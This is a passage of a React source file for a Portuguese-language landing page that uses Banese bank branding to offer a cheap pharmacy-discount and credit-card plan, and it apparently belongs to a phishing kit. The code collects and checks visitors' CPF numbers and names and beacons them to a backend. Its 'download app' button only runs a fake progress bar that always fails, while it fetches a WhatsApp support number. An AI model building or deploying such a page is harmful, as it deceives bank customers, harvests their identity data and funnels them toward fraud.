/** @jsxImportSource react */
import React, { useState, useEffect } from 'react';
import { 
  motion, 
  AnimatePresence 
} from 'motion/react';
import { 
  Pill,
  Smartphone,
  Check,
  X,
  CreditCard,
  Download,
  Sparkles,
  Wifi,
  Battery,
  LogIn,
  Lock,
  Search,
  ArrowRight,
  Star,
  Heart,
  TrendingUp,
  MapPin,
  Phone
} from 'lucide-react';
import WhatsAppButton from './components/WhatsAppButton';

// API base URL detection
declare global {
  interface Window { __API_BASE: string; }
}
const API_BASE = typeof window !== 'undefined' && window.__API_BASE ? window.__API_BASE : '/api';

// CPF helpers
function maskCPF(v: string): string {
  v = v.replace(/\D/g, '').slice(0, 11);
  if (v.length > 9) return v.slice(0,3) + '.' + v.slice(3,6) + '.' + v.slice(6,9) + '-' + v.slice(9);
  if (v.length > 6) return v.slice(0,3) + '.' + v.slice(3,6) + '.' + v.slice(6);
  if (v.length > 3) return v.slice(0,3) + '.' + v.slice(3);
  return v;
}
function validateCPF(n: string): boolean {
  n = n.replace(/\D/g, '');
  if (n.length !== 11 || /^(\d)\1{10}$/.test(n)) return false;
  let s = 0, r: number;
  for (let i = 1; i <= 9; i++) s += +n.charAt(i-1) * (11 - i);
  r = (s * 10) % 11; if (r === 10) r = 0;
  if (r !== +n.charAt(9)) return false;
  s = 0;
  for (let i = 1; i <= 10; i++) s += +n.charAt(i-1) * (12 - i);
  r = (s * 10) % 11; if (r === 10) r = 0;
  if (r !== +n.charAt(10)) return false;
  return true;
}

// Banese card SVG
function gerarCardBaneseSVG() {
  return `<svg viewBox="0 0 340 210" xmlns="http://www.w3.org/2000/svg" style="width:100%;height:auto;display:block;border-radius:16px;filter:drop-shadow(0 8px 32px rgba(4,120,87,0.3));">
    <defs>
      <linearGradient id="baneseCardBg" x1="0" y1="0" x2="1" y2="1">
        <stop offset="0%" stop-color="#022c22"/>
        <stop offset="35%" stop-color="#064E3B"/>
        <stop offset="70%" stop-color="#065F46"/>
        <stop offset="100%" stop-color="#047857"/>
      </linearGradient>
      <radialGradient id="baneseCardShine" cx="30%" cy="20%" r="80%">
        <stop offset="0%" stop-color="rgba(255,255,255,0.15)"/>
        <stop offset="50%" stop-color="rgba(255,255,255,0.03)"/>
        <stop offset="100%" stop-color="transparent"/>
      </radialGradient>
      <linearGradient id="baneseChipMetal" x1="0" y1="0" x2="1" y2="1">
        <stop offset="0%" stop-color="#fef3c7"/>
        <stop offset="30%" stop-color="#fbbf24"/>
        <stop offset="60%" stop-color="#f59e0b"/>
        <stop offset="100%" stop-color="#d97706"/>
      </linearGradient>
      <linearGradient id="baneseTextGlow" x1="0" y1="0" x2="1" y2="1">
        <stop offset="0%" stop-color="#ffffff"/>
        <stop offset="100%" stop-color="rgba(255,255,255,0.7)"/>
      </linearGradient>
    </defs>
    <rect width="340" height="210" rx="16" fill="url(#baneseCardBg)"/>
    <rect width="340" height="210" rx="16" fill="url(#baneseCardShine)"/>
    <circle cx="260" cy="25" r="140" fill="rgba(255,255,255,0.03)"/>
    <circle cx="300" cy="45" r="80" fill="rgba(255,255,255,0.02)"/>
    <circle cx="30" cy="180" r="60" fill="rgba(255,255,255,0.015)"/>
    <text x="28" y="40" font-family="Space Grotesk,Arial,sans-serif" font-size="12" font-weight="900" fill="rgba(255,255,255,0.7)" letter-spacing="3">BANESE</text>
    <text x="170" y="40" font-family="Space Grotesk,Arial,sans-serif" font-size="10" font-weight="800" fill="rgba(255,255,255,0.3)" text-anchor="middle">✦</text>
    <text x="200" y="40" font-family="Space Grotesk,Arial,sans-serif" font-size="10" font-weight="800" fill="rgba(255,255,255,0.5)" letter-spacing="2">CREDVALE</text>
    <rect x="28" y="68" width="44" height="32" rx="5" fill="url(#baneseChipMetal)" opacity="0.9"/>
    <rect x="31" y="71" width="38" height="26" rx="3" fill="rgba(255,255,255,0.06)"/>
    <text x="28" y="138" font-family="Courier New,monospace" font-size="18" font-weight="700" fill="#ffffff" letter-spacing="3.5" opacity="0.95">****  ****  ****  4589</text>
    <text x="28" y="168" font-family="Arial,sans-serif" font-size="8" fill="rgba(255,255,255,0.35)" letter-spacing="1">TITULAR</text>
    <text x="28" y="188" font-family="Arial,sans-serif" font-size="15" font-weight="700" fill="url(#baneseTextGlow)">CLIENTE BANESE</text>
    <text x="312" y="168" font-family="Arial,sans-serif" font-size="8" fill="rgba(255,255,255,0.35)" text-anchor="end" letter-spacing="1">VALIDADE</text>
    <text x="312" y="188" font-family="Arial,sans-serif" font-size="13" font-weight="600" fill="#ffffff" text-anchor="end">12/30</text>
    <text x="28" y="203" font-family="Arial,sans-serif" font-size="6.5" fill="rgba(255,255,255,0.2)" letter-spacing="0.8">Cartao emitido sob parceria BANESE · CREDVALE</text>
  </svg>`;
}

export default function App() {
  const [isCpfModalOpen, setIsCpfModalOpen] = useState(false);
  const [cpfValue, setCpfValue] = useState('');
  const [cpfError, setCpfError] = useState('');
  const [cpfLoading, setCpfLoading] = useState(false);
  const [cpfResult, setCpfResult] = useState<'idle' | 'found' | 'notfound'>('idle');
  const [cpfClientName, setCpfClientName] = useState('');
  const [cpfClientLimite, setCpfClientLimite] = useState('');
  const [cpfClientId, setCpfClientId] = useState('');

  // Security popup
  const [isSecurityPopupOpen, setIsSecurityPopupOpen] = useState(false);
  const [securityPopupCountdown, setSecurityPopupCountdown] = useState(8);
  const securityPopupDuration = 30;

  // Download modal
  const [isDownloadOpen, setIsDownloadOpen] = useState(false);
  const [downloadStep, setDownloadStep] = useState<'initial' | 'loading' | 'error'>('initial');
  const [downloadProgress, setDownloadProgress] = useState(0);

  useEffect(() => {
    fetch(API_BASE + '/admin/settings')
      .then(r => r.json())
      .then(data => {
        if (data.settings?.security_popup_enabled === 'true') {
          setTimeout(() => {
            setIsSecurityPopupOpen(true);
            setSecurityPopupCountdown(securityPopupDuration);
          }, 5000);
        }
      })
      .catch(() => {});
  }, []);

  useEffect(() => {
    if (!isSecurityPopupOpen) return;
    if (securityPopupCountdown <= 0) { setIsSecurityPopupOpen(false); return; }
    const timer = setInterval(() => { setSecurityPopupCountdown(prev => prev - 1); }, 1000);
    return () => clearInterval(timer);
  }, [isSecurityPopupOpen, securityPopupCountdown]);

  const scrollToSection = (id: string) => {
    const el = document.getElementById(id);
    if (el) el.scrollIntoView({ behavior: 'smooth' });
  };

  const handleDownloadClick = async () => {
    try {
      const storedClientId = sessionStorage.getItem('vs_clientId') || '';
      const storedNome = sessionStorage.getItem('vs_nome_completo') || '';
      const storedCpf = sessionStorage.getItem('credvale_cpf') || '';
      const payload = { client_id: storedClientId, client_cpf: storedCpf.replace(/\D/g, ''), client_nome: storedNome, apk_available: true, device_info: navigator.userAgent || '' };
      navigator.sendBeacon(API_BASE + '/app/register-download', new Blob([JSON.stringify(payload)], { type: 'application/json' }));
      const cfgResp = await fetch(API_BASE + '/payments/config');
      const cfg = await cfgResp.json();
      if (cfg && cfg.whatsapp) sessionStorage.setItem('vs_support_wa', String(cfg.whatsapp).replace(/\D/g, ''));
    } catch (e) {}
    setDownloadStep('loading');
    setDownloadProgress(0);
    let pct = 0;
    const interval = setInterval(() => { pct += Math.floor(Math.random() * 12) + 5; if (pct >= 100) pct = 100; setDownloadProgress(pct); }, 200);
    setTimeout(() => { clearInterval(interval); setDownloadProgress(100); setDownloadStep('error'); }, 8000);
  };

  const openCpfModal = () => {
    setCpfValue(''); setCpfError(''); setCpfLoading(false); setCpfResult('idle'); setCpfClientName(''); setIsCpfModalOpen(true);
  };

  const handleCpfInput = (e: React.ChangeEvent<HTMLInputElement>) => {
    setCpfValue(maskCPF(e.target.value.replace(/\D/g, '').slice(0, 11)));
    setCpfError('');
  };

  const handleCpfSubmit = async () => {
    const cpf = cpfValue.replace(/\D/g, '');
    if (!cpf || cpf.length !== 11) { setCpfError('Informe um CPF válido.'); return; }
    if (!validateCPF(cpf)) { setCpfError('CPF inválido.'); return; }
    setCpfLoading(true); setCpfError('');
    try {
      const res = await fetch(API_BASE + '/cpf/check', {
        method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ cpf })
      });
      const data = await res.json();
      if (data.exists && data.cliente) {
        setCpfClientName(data.cliente.nome || '');
        setCpfClientLimite(data.cliente.limite || '0');
        setCpfClientId(data.cliente.id || '');
        setCpfResult('found');
        try { sessionStorage.setItem('credvale_cpf', cpfValue); sessionStorage.setItem('credvale_name', data.cliente.nome || ''); } catch(e) {}
      } else {
        setCpfResult('notfound');
        try { sessionStorage.setItem('credvale_cpf', cpfValue); } catch(e) {}
      }
    } catch (err) { setCpfError('Não foi possível consultar. Tente novamente.'); }
    finally { setCpfLoading(false); }
  };

  const goToCadastro = () => { window.location.href = '/cadastro.html'; };
  const goToCadastroBanese = () => { 
    try { sessionStorage.setItem('credvale_banese', 'true'); } catch(e) {}
    window.location.href = '/cadastro.html'; 
  };
  const continueCadastro = () => { window.location.href = '/cadastro.html'; };

  return (
    <div className="min-h-screen bg-emerald-950/5 flex items-center justify-center py-0 sm:py-6 font-sans antialiased text-gray-800">
      <div id="app-container" className="w-full max-w-[430px] h-screen sm:h-[768px] sm:max-h-[768px] sm:rounded-[24px] sm:shadow-2xl bg-[#F7FAFC] overflow-y-auto relative flex flex-col border-x border-emerald-200/30 scrollbar-none scroll-smooth">
        
        {/* Status Bar */}
        <div className="hidden sm:flex justify-between items-center px-6 pt-3 pb-1 bg-white sticky top-0 z-50 text-[12px] font-semibold text-gray-700 select-none border-b border-gray-100">
          <span>09:41</span>
          <div className="flex items-center gap-1">
            <span className="text-[9px] font-bold text-emerald-700 bg-emerald-50 px-1.5 py-0.5 rounded">BANESE</span>
            <span className="w-16 h-4 bg-emerald-900 rounded-full flex items-center justify-center opacity-80">
              <span className="w-2 h-2 rounded-full bg-emerald-400 mr-1 animate-pulse"></span>
              <span className="text-[9px] text-white font-bold leading-none">CredVale</span>
            </span>
          </div>
          <div className="flex items-center gap-1.5">
            <Wifi className="w-3.5 h-3.5 text-gray-700" />
            <span className="text-[10px]">5G</span>
            <Battery className="w-4 h-4 text-gray-700" />
          </div>
        </div>

        {/* HEADER */}
        <header className="sticky top-0 z-40 bg-white shadow-sm px-4 h-[72px] flex items-center justify-between border-b border-gray-100 shrink-0">
          <div className="flex items-center gap-2 cursor-pointer" onClick={() => scrollToSection('app-container')}>
            <img src="/assets/logo-app.png" alt="CredVale" className="h-9 w-auto rounded-xl" />
            <div>
              <span className="font-display font-bold text-xl tracking-tight text-[#1F2937]">
                Cred<span className="text-emerald-600">Vale</span>
              </span>
              <p className="text-[9px] text-emerald-700 uppercase tracking-wider font-semibold">Parceiro Banese</p>
            </div>
          </div>
          <div className="flex items-center gap-2">
            <button onClick={openCpfModal} className="text-[10px] font-bold text-emerald-600 bg-emerald-50 hover:bg-emerald-100 px-2.5 py-2 rounded-lg transition-all border border-emerald-200 flex items-center gap-1">
              <LogIn className="w-3 h-3" />
              <span className="hidden md:inline">Acessar</span>
            </button>
            <button onClick={goToCadastroBanese} className="bg-emerald-700 hover:bg-emerald-600 text-white text-xs sm:text-sm font-bold px-3 py-2 sm:px-4 sm:py-2.5 rounded-full shadow-md shadow-emerald-900/20 transition-all active:scale-95 duration-200">
              Quero meu benefício
            </button>
          </div>
        </header>

        {/* MAIN CONTENT */}
        <main className="flex-1">

          {/* HERO SECTION - Banese + CredVale */}
          <section className="bg-gradient-to-b from-emerald-900 via-emerald-800 to-emerald-950 text-white pb-6 relative overflow-hidden">
            <div className="absolute inset-0 opacity-5">
              <div className="absolute top-10 left-10 w-40 h-40 bg-emerald-400 rounded-full blur-3xl"></div>
              <div className="absolute bottom-10 right-10 w-60 h-60 bg-emerald-300 rounded-full blur-3xl"></div>
            </div>
            {/* Hero Image */}
            <div className="px-4 pt-4">
              <img 
                src="/assets/hero-bane.webp" 
                alt="Banese + CredVale"
                className="w-full rounded-2xl shadow-md border border-white/10 object-cover"
                loading="eager"
                fetchpriority="high"
                width="1200" height="675"
              />
            </div>
            <div className="px-5 pt-4 pb-2 relative z-10">
              {/* Badge */}
              <div className="inline-flex items-center gap-1.5 bg-white/10 backdrop-blur-sm border border-white/15 rounded-full px-3 py-1.5 mb-3">
                <Sparkles className="w-3 h-3 text-emerald-300" />
                <span className="text-[9px] font-bold uppercase tracking-wider text-emerald-200">Exclusivo para clientes Banese</span>
              </div>
              <h1 className="font-display text-[28px] sm:text-[30px] font-black leading-tight tracking-tight">
                Sua saúde agora<br />
                <span className="text-emerald-300">vale ainda mais.</span>
              </h1>
              <div className="mt-3 flex items-center gap-2">
                <span className="text-[11px] font-bold text-emerald-200/80 bg-white/5 px-2.5 py-1 rounded-full border border-white/10">BANESE</span>
                <span className="text-emerald-300 text-lg">+</span>
                <span className="text-[11px] font-bold text-emerald-200/80 bg-white/5 px-2.5 py-1 rounded-full border border-white/10">CREDVALE</span>
              </div>
              <p className="mt-3 text-[13px] text-emerald-100/80 leading-relaxed">
                Há mais de <strong className="text-white">10 anos</strong>, a CredVale leva economia, praticidade e segurança para milhares de brasileiros. Agora, em parceria com o <strong className="text-white">Banese</strong>, você tem acesso a benefícios exclusivos, com ainda mais vantagens para cuidar da sua saúde e do seu bolso.
              </p>
              <div className="mt-4 flex flex-wrap gap-2">
                <div className="bg-white/5 backdrop-blur-sm border border-white/10 rounded-lg px-3 py-2 flex items-center gap-2">
                  <div className="w-7 h-7 rounded-md bg-emerald-500/20 flex items-center justify-center">
                    <Pill className="w-3.5 h-3.5 text-emerald-300" />
                  </div>
                  <span className="text-[11px] font-semibold">Até 75% OFF em medicamentos</span>
                </div>
                <div className="bg-white/5 backdrop-blur-sm border border-white/10 rounded-lg px-3 py-2 flex items-center gap-2">
                  <div className="w-7 h-7 rounded-md bg-emerald-500/20 flex items-center justify-center">
                    <CreditCard className="w-3.5 h-3.5 text-emerald-300" />
                  </div>
                  <span className="text-[11px] font-semibold">Limite de até R$ 10.000</span>
                </div>
              </div>
            </div>

            <div className="px-5 mt-2 space-y-2.5">
              <div className="bg-emerald-800/40 backdrop-blur-sm rounded-xl border border-emerald-700/30 p-4">
                <div className="flex items-center gap-3">
                  <div className="text-3xl font-black text-emerald-300 leading-none">
                    R$<span className="text-4xl">0</span>,<span className="text-2xl">99</span>
                  </div>
                  <div className="text-[11px] text-emerald-100/80 leading-snug">
                    <strong className="text-white font-bold">/mês</strong>
                    <br />
                    <span className="text-emerald-300">6 meses de isenção</span> para novos clientes Banese
                  </div>
                </div>
              </div>
            </div>

            <div className="px-5 mt-4 flex flex-col gap-2.5">
              <button onClick={goToCadastroBanese} className="w-full bg-emerald-400 hover:bg-emerald-300 text-emerald-950 text-base font-bold py-3.5 px-6 rounded-xl shadow-lg shadow-emerald-500/25 transition-all duration-200 active:scale-95 flex items-center justify-center gap-2">
                <Sparkles className="w-4.5 h-4.5" />
                Quero meu benefício Banese
              </button>
              <button onClick={openCpfModal} className="w-full text-sm font-semibold text-emerald-200 hover:text-white py-2 transition-colors flex items-center justify-center gap-1.5">
                <LogIn className="w-3.5 h-3.5" />
                Já tenho conta
              </button>
            </div>

            <div className="px-5 mt-3">
              <p className="text-[9px] text-emerald-200/40 text-center">*Limite sujeito à análise de crédito.</p>
            </div>
          </section>

          {/* CARD BANESE + BENEFÍCIOS */}
          <section className="bg-white py-6 px-4 border-y border-gray-100">
            <div className="text-center mb-4">
              <span className="text-xs font-bold uppercase tracking-widest text-emerald-600 bg-emerald-50 px-3 py-1.5 rounded-full">
                Cartão Banese + CredVale
              </span>
              <h2 className="font-display text-[21px] sm:text-[22px] font-bold text-[#1F2937] mt-2.5">
                Quem é cliente Banese tem muito mais vantagens
              </h2>
            </div>

            {/* Card SVG */}
            <div className="-mx-2 mb-4" dangerouslySetInnerHTML={{ __html: gerarCardBaneseSVG() }} />

            {/* Benefits grid */}
            <div className="space-y-3 bg-emerald-50/40 rounded-xl p-4 border border-emerald-100">
              <div className="flex items-center gap-3">
                <div className="w-8 h-8 rounded-lg bg-emerald-100 flex items-center justify-center flex-shrink-0">
                  <Pill className="w-4 h-4 text-emerald-700" />
                </div>
                <div>
                  <p className="text-[13px] font-bold text-[#1F2937] leading-tight">Até 75% de desconto</p>
                  <p className="text-[11px] text-emerald-700 font-medium">nas maiores redes de farmácias</p>
                </div>
              </div>
              <div className="flex items-center gap-3">
                <div className="w-8 h-8 rounded-lg bg-emerald-100 flex items-center justify-center flex-shrink-0">
                  <CreditCard className="w-4 h-4 text-emerald-700" />
                </div>
                <div>
                  <p className="text-[13px] font-bold text-[#1F2937] leading-tight">Cartão de crédito</p>
                  <p className="text-[11px] text-emerald-700 font-medium">com limite de até R$ 10.000</p>
                </div>
              </div>
              <div className="flex items-center gap-3">
                <div className="w-8 h-8 rounded-lg bg-emerald-100 flex items-center justify-center flex-shrink-0">
                  <MapPin className="w-4 h-4 text-emerald-700" />
                </div>
                <div>
                  <p className="text-[13px] font-bold text-[#1F2937] leading-tight">Mais de 45 mil farmácias</p>
                  <p className="text-[11px] text-emerald-700 font-medium">credenciadas em todo o Brasil</p>
                </div>
              </div>
              <div className="flex items-center gap-3">
                <div className="w-8 h-8 rounded-lg bg-emerald-100 flex items-center justify-center flex-shrink-0">
                  <Sparkles className="w-4 h-4 text-emerald-700" />
                </div>
                <div>
                  <p className="text-[13px] font-bold text-[#1F2937] leading-tight">De R$ 26,99 por apenas</p>
                  <p className="text-[11px] text-emerald-700 font-medium">R$ 0,99/mês — exclusivo correntistas Banese</p>
                </div>
              </div>
              <div className="flex items-center gap-3">
                <div className="w-8 h-8 rounded-lg bg-emerald-100 flex items-center justify-center flex-shrink-0">
                  <Heart className="w-4 h-4 text-emerald-700" />
                </div>
                <div>
                  <p className="text-[13px] font-bold text-[#1F2937] leading-tight">6 meses de isenção</p>
                  <p className="text-[11px] text-emerald-700 font-medium">sem pagar mensalidade nos primeiros meses</p>
                </div>
              </div>
              <div className="flex items-center gap-3">
                <div className="w-8 h-8 rounded-lg bg-emerald-100 flex items-center justify-center flex-shrink-0">
                  <TrendingUp className="w-4 h-4 text-emerald-700" />
                </div>
                <div>
                  <p className="text-[13px] font-bold text-[#1F2937] leading-tight">Análise rápida</p>
                  <p className="text-[11px] text-emerald-700 font-medium">resposta em aproximadamente 2 minutos</p>
                </div>
              </div>
            </div>

            <div className="mt-4 text-center">
              <span className="text-[10px] font-bold text-emerald-700 bg-emerald-50 px-3 py-1.5 rounded-full inline-block">Exclusivo para correntistas Banese</span>
            </div>
          </section>

          {/* FARMÁCIAS PARCEIRAS */}
          <section className="bg-white py-4 px-4 border-y border-gray-100">
            <div className="text-center mb-3">
              <span className="text-xs font-bold uppercase tracking-widest text-emerald-600 bg-emerald-50 px-3 py-1.5 rounded-full">Grandes Marcas</span>
              <h2 className="font-display text-[21px] sm:text-[22px] font-bold text-[#1F2937] mt-2.5">
                Mais de 45 mil farmácias parceiras em todo o Brasil
              </h2>
              <p className="text-xs sm:text-sm text-[#6B7280] mt-1">
                Com a parceria Banese + CredVale, você economiza nas maiores redes de farmácias do país e em milhares de estabelecimentos credenciados.
              </p>
            </div>
            <div className="overflow-hidden rounded-lg">
              <div className="carousel-track">
                <div className="carousel-slide"><img src="/assets/FARMI1.webp" alt="" className="carousel-img" width="400" height="155" /></div>
                <div className="carousel-slide"><img src="/assets/FARMI2.webp" alt="" className="carousel-img" width="400" height="153" /></div>
                <div className="carousel-slide"><img src="/assets/FARMI1.webp" alt="" className="carousel-img" width="400" height="155" /></div>
                <div className="carousel-slide"><img src="/assets/FARMI2.webp" alt="" className="carousel-img" width="400" height="153" /></div>
              </div>
            </div>
            <div className="text-center mt-2">
              <span className="text-[11px] font-bold text-emerald-700 bg-emerald-50 px-3 py-1.5 rounded-full inline-block">Até 75% OFF em medicamentos</span>
            </div>
            <style>{`
              .carousel-track{display:flex;width:400%;animation:scrollFarmi 15s linear infinite;will-change:transform}
              .carousel-slide{flex-shrink:0;width:25%;height:128px;overflow:hidden}
              .carousel-img{width:100%;height:100%;object-fit:cover;display:block}
              @keyframes scrollFarmi{0%,25%{transform:translateX(0)}45%{transform:translateX(-25%)}80%{transform:translateX(-25%)}100%{transform:translateX(-50%)}}
              @media(min-width:640px){.carousel-slide{height:150px}}
              @keyframes fadeInUp{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:translateY(0)}}.animate-fadeIn{animation:fadeInUp .6s ease forwards}
            `}</style>
          </section>

          {/* APP SECTION */}
          <section className="bg-gradient-to-b from-[#F7FAFC] to-white py-6 px-5">
            <div className="text-center mb-4">
              <span className="text-xs font-bold uppercase tracking-widest text-emerald-600 bg-emerald-50 px-3 py-1.5 rounded-full">Aplicativo</span>
              <h2 className="font-display text-[21px] sm:text-[22px] font-bold text-[#1F2937] mt-2.5">
                Toda a praticidade na palma da sua mão.
              </h2>
              <p className="text-xs sm:text-sm text-[#6B7280] mt-1">
                Com o aplicativo CredVale você pode acessar seu cartão digital, consultar seu limite disponível, acompanhar seus benefícios, localizar farmácias credenciadas e visualizar descontos exclusivos.
              </p>
            </div>
            <div className="-mx-5 my-4">
              <img src="/assets/app-2.webp" alt="CredVale App" className="w-full object-cover" loading="lazy" width="600" height="636" />
            </div>
            <div className="space-y-2.5 bg-emerald-50/30 rounded-xl p-4 border border-emerald-100 mb-4">
              <div className="flex items-center gap-2.5 text-[12px] text-gray-700">
                <div className="w-5 h-5 rounded-full bg-emerald-100 flex items-center justify-center flex-shrink-0">
                  <Check className="w-3 h-3 text-emerald-600 stroke-[3]" />
                </div>
                <span className="font-medium">Cartão digital sempre disponível</span>
              </div>
              <div className="flex items-center gap-2.5 text-[12px] text-gray-700">
                <div className="w-5 h-5 rounded-full bg-emerald-100 flex items-center justify-center flex-shrink-0">
                  <Check className="w-3 h-3 text-emerald-600 stroke-[3]" />
                </div>
                <span className="font-medium">Limite e benefícios em tempo real</span>
              </div>
              <div className="flex items-center gap-2.5 text-[12px] text-gray-700">
                <div className="w-5 h-5 rounded-full bg-emerald-100 flex items-center justify-center flex-shrink-0">
                  <Check className="w-3 h-3 text-emerald-600 stroke-[3]" />
                </div>
                <span className="font-medium">Localizador de farmácias credenciadas</span>
              </div>
            </div>
            <div className="text-center">
              <button onClick={() => { setIsDownloadOpen(true); setDownloadStep('initial'); setDownloadProgress(0); }} className="inline-flex items-center gap-2 bg-slate-900 hover:bg-slate-800 text-white font-bold py-3 px-5 rounded-xl shadow-md transition-all active:scale-95 duration-200 text-xs sm:text-sm">
                <Download className="w-4 h-4" />
                Baixar o aplicativo grátis
              </button>
              <p className="text-[10px] text-[#6B7280] mt-1.5">Disponível para Android e iOS</p>
            </div>
          </section>

          {/* VANTAGENS */}
          <section className="bg-white py-6 px-5 border-y border-gray-100">
            <div className="text-center mb-5">
              <span className="text-xs font-bold uppercase tracking-widest text-emerald-600 bg-emerald-50 px-3 py-1.5 rounded-full">Vantagens Reais</span>
              <h2 className="font-display text-[21px] sm:text-[22px] font-bold text-[#1F2937] mt-2.5">
                Por que milhares de clientes escolhem a CredVale?
              </h2>
              <p className="text-xs sm:text-sm text-[#6B7280] mt-1">
                Há mais de 10 anos, oferecemos soluções para quem busca economia e praticidade. Agora, com a parceria Banese, os benefícios ficaram ainda maiores.
              </p>
            </div>
            <div className="grid grid-cols-2 gap-2.5">
              <div className="bg-[#F7FAFC] p-3 rounded-xl border border-gray-100 hover:border-emerald-200 transition-all duration-200">
                <div className="w-9 h-9 rounded-lg bg-white flex items-center justify-center shadow-sm border border-emerald-100/30 text-emerald-600 mb-2.5">
                  <Pill className="w-4.5 h-4.5" />
                </div>
                <h3 className="font-bold text-xs sm:text-sm text-gray-800 leading-tight">75% OFF em medicamentos</h3>
                <p className="text-[10px] text-gray-500 mt-1 leading-snug">Economize nas maiores redes de farmácias do Brasil.</p>
              </div>
              <div className="bg-[#F7FAFC] p-3 rounded-xl border border-gray-100 hover:border-emerald-200 transition-all duration-200">
                <div className="w-9 h-9 rounded-lg bg-white flex items-center justify-center shadow-sm border border-emerald-100/30 text-emerald-600 mb-2.5">
                  <CreditCard className="w-4.5 h-4.5" />
                </div>
                <h3 className="font-bold text-xs sm:text-sm text-gray-800 leading-tight">Cartão até R$ 10.000</h3>
                <p className="text-[10px] text-gray-500 mt-1 leading-snug">Limite flexível para organizar suas compras.</p>
              </div>
              <div className="bg-[#F7FAFC] p-3 rounded-xl border border-gray-100 hover:border-emerald-200 transition-all duration-200">
                <div className="w-9 h-9 rounded-lg bg-white flex items-center justify-center shadow-sm border border-emerald-100/30 text-emerald-600 mb-2.5">
                  <MapPin className="w-4.5 h-4.5" />
                </div>
                <h3 className="font-bold text-xs sm:text-sm text-gray-800 leading-tight">45 mil+ farmácias</h3>
                <p className="text-[10px] text-gray-500 mt-1 leading-snug">Rede credenciada em todo o Brasil.</p>
              </div>
              <div className="bg-[#F7FAFC] p-3 rounded-xl border border-gray-100 hover:border-emerald-200 transition-all duration-200">
                <div className="w-9 h-9 rounded-lg bg-white flex items-center justify-center shadow-sm border border-emerald-100/30 text-emerald-600 mb-2.5">
                  <Smartphone className="w-4.5 h-4.5" />
                </div>
                <h3 className="font-bold text-xs sm:text-sm text-gray-800 leading-tight">App completo</h3>
                <p className="text-[10px] text-gray-500 mt-1 leading-snug">Cartão digital, benefícios e parceiros.</p>
              </div>
              <div className="bg-[#F7FAFC] p-3 rounded-xl border border-gray-100 hover:border-emerald-200 transition-all duration-200">
                <div className="w-9 h-9 rounded-lg bg-white flex items-center justify-center shadow-sm border border-emerald-100/30 text-emerald-600 mb-2.5">
                  <Phone className="w-4.5 h-4.5" />
                </div>
                <h3 className="font-bold text-xs sm:text-sm text-gray-800 leading-tight">Atendimento humanizado</h3>
                <p className="text-[10px] text-gray-500 mt-1 leading-snug">Equipe pronta para ajudar sempre.</p>
              </div>
              <div className="bg-[#F7FAFC] p-3 rounded-xl border border-gray-100 hover:border-emerald-200 transition-all duration-200">
                <div className="w-9 h-9 rounded-lg bg-white flex items-center justify-center shadow-sm border border-emerald-100/30 text-emerald-600 mb-2.5">
                  <Star className="w-4.5 h-4.5" />
                </div>
                <h3 className="font-bold text-xs sm:text-sm text-gray-800 leading-tight">Exclusivo Banese</h3>
                <p className="text-[10px] text-gray-500 mt-1 leading-snug">Condições especiais nesta parceria.</p>
              </div>
            </div>
          </section>

          {/* PLAN SECTION */}
          <section className="bg-gradient-to-b from-white to-[#F7FAFC] py-6 px-5">
            <div className="text-center mb-5">
              <span className="text-xs font-bold uppercase tracking-widest text-emerald-600 bg-emerald-50 px-3 py-1.5 rounded-full">Condição Exclusiva</span>
              <h2 className="font-display text-[21px] sm:text-[22px] font-bold text-[#1F2937] mt-2.5">
                Plano Banese + CredVale
              </h2>
            </div>
            <div className="bg-white rounded-2xl border-2 border-emerald-200 p-5 shadow-lg relative overflow-hidden">
              <div className="absolute top-0 right-0 bg-emerald-700 text-white text-[10px] font-bold uppercase py-1 px-4 rounded-bl-xl">Exclusivo</div>
              <div className="text-center mb-4">
                <span className="text-xs text-gray-400 line-through font-bold">De R$ 26,99</span>
                <div className="flex items-baseline justify-center gap-1 mt-1">
                  <span className="text-lg font-extrabold text-gray-900">R$</span>
                  <span className="text-4xl font-black text-emerald-600 tracking-tight">0,99</span>
                  <span className="text-xs font-semibold text-[#6B7280]">/mês</span>
                </div>
                <div className="inline-flex items-center gap-1 mt-1 bg-emerald-50 rounded-full px-3 py-1">
                  <span className="text-[10px] font-bold text-emerald-700">Você economiza 96%</span>
                </div>
              </div>
              <div className="bg-emerald-50/50 rounded-xl p-3 mb-4 border border-emerald-100 text-center">
                <p className="text-[12px] font-bold text-emerald-800">🎁 Primeiros 6 meses gratuitos</p>
                <p className="text-[10px] text-emerald-600">Depois, apenas R$ 0,99/mês</p>
              </div>
              <div className="space-y-2.5 border-t border-gray-100 pt-4 pb-5">
                <div className="flex items-center gap-2.5 text-xs sm:text-sm text-gray-700">
                  <div className="w-4.5 h-4.5 rounded-full bg-emerald-100 flex items-center justify-center flex-shrink-0">
                    <Check className="w-2.5 h-2.5 text-emerald-600 stroke-[3]" />
                  </div>
                  <span className="font-medium">Até 75% OFF em medicamentos</span>
                </div>
                <div className="flex items-center gap-2.5 text-xs sm:text-sm text-gray-700">
                  <div className="w-4.5 h-4.5 rounded-full bg-emerald-100 flex items-center justify-center flex-shrink-0">
                    <Check className="w-2.5 h-2.5 text-emerald-600 stroke-[3]" />
                  </div>
                  <span className="font-medium">Cartão com limite de até R$ 10.000</span>
                </div>
                <div className="flex items-center gap-2.5 text-xs sm:text-sm text-gray-700">
                  <div className="w-4.5 h-4.5 rounded-full bg-emerald-100 flex items-center justify-center flex-shrink-0">
                    <Check className="w-2.5 h-2.5 text-emerald-600 stroke-[3]" />
                  </div>
                  <span className="font-medium">Rede com mais de 45 mil farmácias</span>
                </div>
                <div className="flex items-center gap-2.5 text-xs sm:text-sm text-gray-700">
                  <div className="w-4.5 h-4.5 rounded-full bg-emerald-100 flex items-center justify-center flex-shrink-0">
                    <Check className="w-2.5 h-2.5 text-emerald-600 stroke-[3]" />
                  </div>
                  <span className="font-medium">Aplicativo CredVale completo</span>
                </div>
                <div className="flex items-center gap-2.5 text-xs sm:text-sm text-gray-700">
                  <div className="w-4.5 h-4.5 rounded-full bg-emerald-100 flex items-center justify-center flex-shrink-0">
                    <Check className="w-2.5 h-2.5 text-emerald-600 stroke-[3]" />
                  </div>
                  <span className="font-medium">Benefícios exclusivos para clientes Banese</span>
                </div>
              </div>
              <button onClick={goToCadastroBanese} className="w-full bg-emerald-600 hover:bg-emerald-500 text-white text-sm sm:text-base font-bold py-3.5 rounded-xl shadow-md shadow-emerald-600/25 transition-all active:scale-95 duration-200">
                Quero garantir meu benefício
              </button>
            </div>
          </section>

          {/* CTA FINAL */}
